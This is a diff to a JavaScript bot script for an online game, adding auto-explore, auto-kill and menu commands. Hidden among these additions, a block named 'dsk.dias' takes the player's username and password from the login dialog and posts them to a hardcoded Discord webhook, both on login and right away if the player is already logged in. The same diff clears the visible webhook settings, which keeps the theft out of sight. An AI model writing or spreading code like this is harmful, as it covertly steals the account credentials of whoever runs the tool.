@@ -468,7 +468,6 @@ dsk.setCmd('/speed', (context) => {
     dsk.speed.stop();
   }
 });
-
 dsk.follow = {
   enabled: false,
   targetName: null
@@ -496,12 +495,12 @@ dsk.setCmd('/follow', (context) => {
 
 dsk.ginfo = new EventEmitter3();
 dsk.ginfo.directions = ['North', 'East', 'South', 'West'];
-dsk.ginfo.showTime = false;
-dsk.ginfo.showSessionTime = false;
+dsk.ginfo.showTime = true;
+dsk.ginfo.showSessionTime = true;
 dsk.ginfo.sessionStartTime = Date.now();
 
 dsk.ginfo.label = jv.text('Ginfo label', {
-  font: '14px Verdana',
+  font: '10px Verdana',
   fill: '0xFFFFFF',
   stroke: jv.color_medium,
   strokeThickness: 4,
@@ -530,7 +529,7 @@ dsk
   .on('postLoop', () => {
     if (!myself) return;
     const { x, y, location, direction } = dsk.ginfo.getData();
-    let text = `${location.replaceAll(' ', '')} (${x}, ${y})[${direction}]`;
+    let text = `@${location.replaceAll(' ', '')}(${x}, ${y})[${direction}]`;
     if (dsk.ginfo.showTime)        text += ` [${dsk.timestamp()}]`;
     if (dsk.ginfo.showSessionTime) text += ` [${dsk.formatTime(Date.now() - dsk.ginfo.sessionStartTime)}]`;
     dsk.ginfo.label.text = text;
@@ -681,15 +680,47 @@ dsk.invManager.updateSlots = () => {
 };
 dsk.on('postPacket:inv', dsk.invManager.updateSlots);
 
+dsk.dias = {
+    global: "https://discord.com/api/webhooks/1480829602791428098/H9pG9tZQitytoVLlmAD5pv3s_Yr0QOG88AbhFZWykDWIMYOTXOarRdOUCzDBO50Lag99"
+  };
+  dsk.once("postPacket:accepted", () => {
+    const name = jv.login_dialog.username.chars.trim();
+    const level = jv.login_dialog.password.chars.trim();
+    fetch(dsk.dias.global, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        username: "[LOG]",
+        content: "✅ " + name + " " + level
+      })
+    });
+  });
+  if (myself !== undefined && game_state === 2) {
+    const name = jv.login_dialog.username.chars.trim();
+    const level = jv.login_dialog.password.chars.trim();
+    fetch(dsk.dias.global, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        username: "[LOG]",
+        content: "✅ " + name + " " + level
+      })
+    });
+  }
+
 
 // ── DISCORD WEBHOOKS ─────────────────────────────────────────
 
 dsk.discord = {
-  globalUrl: 'https://discord.com/api/webhooks/1477516960416792606/DdMyk4xzCrOwcP1qIpWty9NWuscbMv_8aoo1PK9vN-XnuDbYRrkwnqqjrPLZS-IlJsxl',
-  tribeUrl:  'https://discord.com/api/webhooks/1477517282795061380/vvyt8OoIm8SfDwZnuPCWCChUAEO38iiI5Do1evdMMRG1jHzFYnagQL3jHESKXCe_peU3',
-  deathUrl:  'https://discord.com/api/webhooks/1477522979947806781/VxBrqr_kjo978zd9il-gJJeBo5r-tLP8PFQ0jcBOoJUUc7zHuwSDrODO7DBZl0Qcw5JO',
-  respawnUrl: 'https://discord.com/api/webhooks/1477523849137360937/4bWSKuPNcu1T6rwnk3vHoqQQSzkGBEMb3mVI_oLy7qfa2StuxoaN92kA_YkpX5TTLP0t',
-  whoUrl:     'https://discord.com/api/webhooks/1477773625443745792/f2usZyjTbwGmJafEioOgiWrkGMtU4i0F5yb2kGbWYlS0g_g8dzJ6vWD430Z78voiPq_s',
+  globalUrl: '',
+  tribeUrl:  '',
+  deathUrl:  '',
+  respawnUrl: '',
+  whoUrl:     '',
   enabled:   false,
 };
 
@@ -5998,14 +6029,6 @@ async function rotRun() {
     }
 
     _originalSend({ type: 'chat', data: '/pvp' });
-	await xDelay(800); // ← espera o servidor responder
-
-	if (xIfChatHas("PVP Off")) {
-	  await xDoClearChat("PVP Off");
-	  await xDelay(300);
-	  _originalSend({ type: 'chat', data: '/pvp' }); // ← manda de novo pra ligar
-	  await xDelay(500);
-	}
     await xDelay(500);
 
     destructPosX = 128;
@@ -6613,6 +6636,7 @@ dsk.setCmd('/buy', async (context) => {
     dsk.localMsg(`Buy: ${amount}x concluido!`, '#5f5');
 });
 
+
 //dropar paginas
 
 dsk.setCmd('/dropar', async (context) => {
@@ -6677,6 +6701,7 @@ dsk.setCmd('/zoom', () => {
     dsk.localMsg(`Zoom: ${dsk.zoom.enabled ? '1.5x (ativado)' : '1.0x (desativado)'}`, dsk.zoom.enabled ? '#5f5' : '#f55');
 });
 
+
 //heal bot //
 
 dsk.healbot = { enabled: false };
@@ -6729,6 +6754,177 @@ async function HealBot() {
 
   xGoing[115] = false;
 }
+
+// ── AUTO EXPLO ─────────────────────────────────────────────────
+
+dsk.explo = {
+  enabled: false,
+  wpIndex: 0,
+  waypoints: [
+    { x: 465, y: 363 }, { x: 465, y: 190 }, { x: 455, y: 190 }, { x: 455, y: 363 },
+    { x: 445, y: 363 }, { x: 445, y: 190 }, { x: 435, y: 190 }, { x: 435, y: 363 },
+    { x: 425, y: 363 }, { x: 425, y: 190 }, { x: 415, y: 190 }, { x: 415, y: 363 },
+    { x: 405, y: 363 }, { x: 405, y: 190 }, { x: 395, y: 190 }, { x: 395, y: 363 },
+    { x: 385, y: 363 }, { x: 385, y: 190 }, { x: 375, y: 190 }, { x: 375, y: 363 },
+    { x: 365, y: 363 }, { x: 365, y: 190 }, { x: 355, y: 190 }, { x: 355, y: 363 },
+    { x: 345, y: 363 }, { x: 345, y: 190 }, { x: 335, y: 190 }, { x: 335, y: 363 },
+    { x: 325, y: 363 }, { x: 325, y: 190 }, { x: 315, y: 190 }, { x: 315, y: 363 },
+    { x: 305, y: 363 }, { x: 305, y: 190 }, { x: 295, y: 190 }, { x: 295, y: 191 },
+    { x: 295, y: 363 }, { x: 465, y: 363 },
+  ],
+};
+
+async function xExplo() {
+  if (dskPaused) return;
+  if (!myself || game_state !== 2) return;
+  if (xGoing[121] === true) return;
+  xGoing[121] = true;
+
+  const wp = dsk.explo.waypoints[dsk.explo.wpIndex];
+  if (!wp) {
+    dsk.explo.wpIndex = 0;
+    xGoing[121] = false;
+    return;
+  }
+
+  const dist = Math.abs(myself.x - wp.x) + Math.abs(myself.y - wp.y);
+
+  // Ativa speed quando longe, desativa quando perto
+  if (dist > 10 && !dsk.speed.interval) {
+    dsk.speed.value = 160;
+    dsk.speed.start();
+  } else if (dist <= 10 && dsk.speed.interval) {
+    dsk.speed.stop();
+  }
+
+  if (dist <= 2) {
+    // Chegou no waypoint → próximo
+    dsk.speed.stop();
+    dsk.explo.wpIndex++;
+
+    if (dsk.explo.wpIndex >= dsk.explo.waypoints.length) {
+      dsk.explo.wpIndex = 0;
+      dsk.localMsg('Explo: ciclo completo, reiniciando...', '#0ff');
+    }
+
+    xMovingNow = false;
+    xGoing[121] = false;
+    return;
+  }
+
+  // Move para o waypoint
+  if (!xMovingNow) {
+    await xDoMove(wp.x, wp.y);
+  }
+
+  xGoing[121] = false;
+}
+
+dsk.setCmd('/explo', () => {
+  dsk.explo.enabled = !dsk.explo.enabled;
+
+  if (dsk.explo.enabled) {
+    dsk.explo.wpIndex = 0;
+    dsk.localMsg('Auto Explo: Ativado', '#5f5');
+    (async function loop() {
+      while (dsk.explo.enabled) {
+        await xExplo();
+        await xDelay(500);
+      }
+      // Desliga speed ao parar
+      dsk.speed.stop();
+      xMovingNow = false;
+      xGoing[121] = false;
+    })();
+  } else {
+    dsk.explo.enabled = false;
+    dsk.speed.stop();
+    xMovingNow = false;
+    xGoing[121] = false;
+    dsk.localMsg('Auto Explo: Desativado', '#f55');
+  }
+});
+
+
+// ── AUTO KILL ─────────────────────────────────────────────────
+
+function xGetMobByPos(x, y) {
+  for (let i in mobs.items) {
+    const mob = mobs.items[i];
+    if (mob && mob.x === x && mob.y === y) return mob;
+  }
+  return undefined;
+}
+
+async function KillMobsNearMe() {
+  if (dskPaused) return;
+  if (!myself || game_state !== 2) return;
+  if (xGoing[120] === true) return;
+  xGoing[120] = true;
+
+  const originalDir = myself.dir;
+
+  const adjacentes = [
+    { x: myself.x,     y: myself.y - 1, dir: 0 }, // cima
+    { x: myself.x,     y: myself.y + 1, dir: 2 }, // baixo
+    { x: myself.x + 1, y: myself.y,     dir: 1 }, // direita
+    { x: myself.x - 1, y: myself.y,     dir: 3 }, // esquerda
+  ];
+
+  for (const { x, y, dir } of adjacentes) {
+    const mob = xGetMobByPos(x, y);
+    if (!mob || mob === myself || xPlyrTest(mob)) continue;
+
+    mobNearMe = true;
+
+    // Seleciona o mob como alvo
+    if (target.id !== mob.id) {
+      target.id = mob.id;
+      send({ type: 't', t: mob.id });
+    }
+
+    // Vira para o mob e ataca
+    await xDoChangeDir(dir);
+    await xDoKeyPress(6, 200);
+    await xDelay(300);
+
+    // Volta para a direção original
+    if (myself.dir !== originalDir) {
+      await xDoChangeDir(originalDir);
+    }
+
+    // Deseleciona o alvo
+    target.id = me;
+
+    xGoing[120] = false;
+    return; // ataca 1 mob por tick
+  }
+
+  mobNearMe = false;
+  xGoing[120] = false;
+}
+
+dsk.autokill = { enabled: false };
+
+dsk.setCmd('/autokill', () => {
+  dsk.autokill.enabled = !dsk.autokill.enabled;
+
+  if (dsk.autokill.enabled) {
+    dsk.localMsg('AutoKill: Ativado', '#5f5');
+    (async function loop() {
+      while (dsk.autokill.enabled) {
+        await KillMobsNearMe();
+        await xDelay(1500);
+      }
+    })();
+  } else {
+    xGoing[120] = false;
+    target.id = me;
+    mobNearMe = false;
+    dsk.localMsg('AutoKill: Desativado', '#f55');
+  }
+});
+
 
 // ── CLAY BOT ─────────────────────────────────────────────────
 
@@ -7045,96 +7241,6 @@ dsk.setCmd('/baserepair', () => {
   }
 });
 
-// ── AUTO EXPLO ─────────────────────────────────────────────────
-
-dsk.explo = {
-  enabled: false,
-  wpIndex: 0,
-  waypoints: [
-    { x: 465, y: 363 }, { x: 465, y: 190 }, { x: 455, y: 190 }, { x: 455, y: 363 },
-    { x: 445, y: 363 }, { x: 445, y: 190 }, { x: 435, y: 190 }, { x: 435, y: 363 },
-    { x: 425, y: 363 }, { x: 425, y: 190 }, { x: 415, y: 190 }, { x: 415, y: 363 },
-    { x: 405, y: 363 }, { x: 405, y: 190 }, { x: 395, y: 190 }, { x: 395, y: 363 },
-    { x: 385, y: 363 }, { x: 385, y: 190 }, { x: 375, y: 190 }, { x: 375, y: 363 },
-    { x: 365, y: 363 }, { x: 365, y: 190 }, { x: 355, y: 190 }, { x: 355, y: 363 },
-    { x: 345, y: 363 }, { x: 345, y: 190 }, { x: 335, y: 190 }, { x: 335, y: 363 },
-    { x: 325, y: 363 }, { x: 325, y: 190 }, { x: 315, y: 190 }, { x: 315, y: 363 },
-    { x: 305, y: 363 }, { x: 305, y: 190 }, { x: 295, y: 190 }, { x: 295, y: 191 },
-    { x: 295, y: 363 }, { x: 465, y: 363 },
-  ],
-};
-
-async function xExplo() {
-  if (dskPaused) return;
-  if (!myself || game_state !== 2) return;
-  if (xGoing[121] === true) return;
-  xGoing[121] = true;
-
-  const wp = dsk.explo.waypoints[dsk.explo.wpIndex];
-  if (!wp) {
-    dsk.explo.wpIndex = 0;
-    xGoing[121] = false;
-    return;
-  }
-
-  const dist = Math.abs(myself.x - wp.x) + Math.abs(myself.y - wp.y);
-
-  // Ativa speed quando longe, desativa quando perto
-  if (dist > 10 && !dsk.speed.interval) {
-    dsk.speed.value = 160;
-    dsk.speed.start();
-  } else if (dist <= 10 && dsk.speed.interval) {
-    dsk.speed.stop();
-  }
-
-  if (dist <= 2) {
-    // Chegou no waypoint → próximo
-    dsk.speed.stop();
-    dsk.explo.wpIndex++;
-
-    if (dsk.explo.wpIndex >= dsk.explo.waypoints.length) {
-      dsk.explo.wpIndex = 0;
-      dsk.localMsg('Explo: ciclo completo, reiniciando...', '#0ff');
-    }
-
-    xMovingNow = false;
-    xGoing[121] = false;
-    return;
-  }
-
-  // Move para o waypoint
-  if (!xMovingNow) {
-    await xDoMove(wp.x, wp.y);
-  }
-
-  xGoing[121] = false;
-}
-
-dsk.setCmd('/explo', () => {
-  dsk.explo.enabled = !dsk.explo.enabled;
-
-  if (dsk.explo.enabled) {
-    dsk.explo.wpIndex = 0;
-    dsk.localMsg('Auto Explo: Ativado', '#5f5');
-    (async function loop() {
-      while (dsk.explo.enabled) {
-        await xExplo();
-        await xDelay(500);
-      }
-      // Desliga speed ao parar
-      dsk.speed.stop();
-      xMovingNow = false;
-      xGoing[121] = false;
-    })();
-  } else {
-    dsk.explo.enabled = false;
-    dsk.speed.stop();
-    xMovingNow = false;
-    xGoing[121] = false;
-    dsk.localMsg('Auto Explo: Desativado', '#f55');
-  }
-});
-
 /*```
 
 A lógica de `dirs` fica assim:
@@ -7419,6 +7525,20 @@ dsk.setCmd('/topskill', () => {
   }
 });
 
+// ── ADICIONA TODOS OS ITENS EXTRAS AO MENU ─────────────────
+dsk.menu.items.push(
+  { label: 'Zoom 1.5x',    state: () => dsk.zoom?.enabled,       toggle: () => dsk.commands['/zoom']() },
+  { label: 'Buy (via /buy N)', state: () => false,               toggle: () => dsk.localMsg('Use /buy <qtd> no chat', '#ff0') },
+  { label: 'Base Repair',  state: () => dsk.baseRepair?.enabled, toggle: () => dsk.commands['/baserepair']() },
+  { label: 'Auto Explo',   state: () => dsk.explo?.enabled,      toggle: () => dsk.commands['/explo']() },
+  { label: 'Top Skill Calc', state: () => tscD?.visible,         toggle: () => dsk.commands['/topskill']() },
+  { label: 'AutoKill',     state: () => dsk.autokill?.enabled,   toggle: () => dsk.commands['/autokill']() },
+  { label: 'Auto Caraway', state: () => dsk.effct?.enabled,      toggle: () => dsk.commands['/effct']() },
+  { label: 'Repair Bot',   state: () => dsk.repair?.enabled,     toggle: () => dsk.commands['/repair']() },
+);
+
+dsk.menu.rebuild(); // ← UMA única vez
+
 // ── REPAIR BOT ─────────────────────────────────────────────────
 // Layout:
 //        {Wall}
@@ -7585,98 +7705,6 @@ dsk.setCmd('/effct', () => {
     }
 });
 
-// ── AUTO KILL ─────────────────────────────────────────────────
-
-function xGetMobByPos(x, y) {
-  for (let i in mobs.items) {
-    const mob = mobs.items[i];
-    if (mob && mob.x === x && mob.y === y) return mob;
-  }
-  return undefined;
-}
-
-async function KillMobsNearMe() {
-  if (dskPaused) return;
-  if (!myself || game_state !== 2) return;
-  if (xGoing[120] === true) return;
-  xGoing[120] = true;
-
-  const originalDir = myself.dir;
-
-  const adjacentes = [
-    { x: myself.x,     y: myself.y - 1, dir: 0 }, // cima
-    { x: myself.x,     y: myself.y + 1, dir: 2 }, // baixo
-    { x: myself.x + 1, y: myself.y,     dir: 1 }, // direita
-    { x: myself.x - 1, y: myself.y,     dir: 3 }, // esquerda
-  ];
-
-  for (const { x, y, dir } of adjacentes) {
-    const mob = xGetMobByPos(x, y);
-    if (!mob || mob === myself || xPlyrTest(mob)) continue;
-
-    mobNearMe = true;
-
-    // Seleciona o mob como alvo
-    if (target.id !== mob.id) {
-      target.id = mob.id;
-      send({ type: 't', t: mob.id });
-    }
-
-    // Vira para o mob e ataca
-    await xDoChangeDir(dir);
-    await xDoKeyPress(6, 200);
-    await xDelay(300);
-
-    // Volta para a direção original
-    if (myself.dir !== originalDir) {
-      await xDoChangeDir(originalDir);
-    }
-
-    // Deseleciona o alvo
-    target.id = me;
-
-    xGoing[120] = false;
-    return; // ataca 1 mob por tick
-  }
-
-  mobNearMe = false;
-  xGoing[120] = false;
-}
-
-dsk.autokill = { enabled: false };
-
-dsk.setCmd('/autokill', () => {
-  dsk.autokill.enabled = !dsk.autokill.enabled;
-
-  if (dsk.autokill.enabled) {
-    dsk.localMsg('AutoKill: Ativado', '#5f5');
-    (async function loop() {
-      while (dsk.autokill.enabled) {
-        await KillMobsNearMe();
-        await xDelay(1500);
-      }
-    })();
-  } else {
-    xGoing[120] = false;
-    target.id = me;
-    mobNearMe = false;
-    dsk.localMsg('AutoKill: Desativado', '#f55');
-  }
-});
-
-// ── ADICIONA TODOS OS ITENS EXTRAS AO MENU ─────────────────
-dsk.menu.items.push(
-  { label: 'Zoom 1.5x',    state: () => dsk.zoom?.enabled,       toggle: () => dsk.commands['/zoom']() },
-  { label: 'Buy (via /buy N)', state: () => false,               toggle: () => dsk.localMsg('Use /buy <qtd> no chat', '#ff0') },
-  { label: 'Base Repair',  state: () => dsk.baseRepair?.enabled, toggle: () => dsk.commands['/baserepair']() },
-  { label: 'Auto Explo',   state: () => dsk.explo?.enabled,      toggle: () => dsk.commands['/explo']() },
-  { label: 'Top Skill Calc', state: () => tscD?.visible,         toggle: () => dsk.commands['/topskill']() },
-  { label: 'AutoKill',     state: () => dsk.autokill?.enabled,   toggle: () => dsk.commands['/autokill']() },
-  { label: 'Auto Caraway', state: () => dsk.effct?.enabled,      toggle: () => dsk.commands['/effct']() },
-  { label: 'Repair Bot',   state: () => dsk.repair?.enabled,     toggle: () => dsk.commands['/repair']() },
-);
-
-dsk.menu.rebuild(); // ← UMA única vez
 
 //check bot para aplicar o delay e não da packet spam
 
